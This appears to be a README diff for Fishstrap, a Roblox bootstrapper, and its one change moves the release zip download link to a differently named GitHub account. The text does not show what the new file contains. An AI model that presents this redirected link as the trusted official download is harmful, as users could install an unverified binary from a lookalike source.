@@ -10,7 +10,7 @@ As a **bloxstrap** alternative, Fishstrap has emerged alongside **voidstrap** as
 
 
 ## Install
-[Download `Fishstrap.zip`](https://github.com/fishstraprblx/Fishstrap-Roblox/releases/download/v2.9.0/Fishstrap.zip)
+[Download `Fishstrap.zip`](https://github.com/FishstrapRobloxFFlags/Fishstrap-Roblox/releases/download/v2.9.0/Fishstrap.zip)
 ---
 
 <img width="583" height="343" alt="images2" src="https://github.com/user-attachments/assets/19991dae-fcc2-405f-8b44-09921068a992" />
